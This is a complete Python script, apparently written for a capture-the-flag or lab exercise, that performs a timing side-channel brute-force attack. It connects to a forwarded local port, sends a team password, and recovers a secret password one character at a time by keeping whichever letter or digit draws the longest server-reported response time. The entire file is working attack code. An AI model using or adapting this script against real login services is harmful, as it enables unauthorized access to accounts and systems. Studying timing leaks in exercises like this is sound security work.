import socket
import string
import re
import time

# Configuration
host = "127.0.0.1"  # The local host after port forwarding
port = 9999         # The forwarded port
character_set = string.ascii_letters + string.digits
max_password_length = 30

# Function to measure response time based on server-provided output
def measure_response_time(partial_password, test_char, s):
	password_attempt = partial_password + test_char + "\n"

	# Send the password attempt
	s.sendall(password_attempt.encode())

	# Receive the response
	response = s.recv(1024).decode()

	# Extract the timing information using regex
	match = re.search(r"In ([\d.]+) Sekunden", response)
	if match:
		reported_time = float(match.group(1))  # Parse the numeric part
		return reported_time
	else:
		print("Unexpected response format.")
		print(f"Server response: {response.strip()}")
		return 0.0

# Bruteforcing logic
def brute_force_password():
	password = ""
	teamPW = "[TEAMPW]\n"
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.connect((host, port))
			time.sleep(0.5)
			s.sendall(teamPW.encode())
			time.sleep(0.5)
			print(s.recv(1024).decode()) #Print first server response
			for i in range(max_password_length):
				best_char = None
				longest_time = 0.0
				for char in character_set:
					response_time = measure_response_time(password, char, s)
					print(f"Testing: {password + char}, Reported Time: {response_time:.5f} Sekunden")

					print(f"Longest time: {longest_time:.5f} Current time: {response_time:.5f}")
					if response_time > longest_time:
						longest_time = response_time
						best_char = char
					print(f"Current best: {best_char}")
					print("---------------------------")

				print(best_char)
				if best_char:
					password += best_char
					print(f"Found character: {best_char}, Current Password: {password}")
				else:
					print("Unable to find the next character. Exiting.")
					break
			return
	except Exception as e:
		print(f"Error during connection: {e}")
		return

# Run the bruteforce
brute_force_password()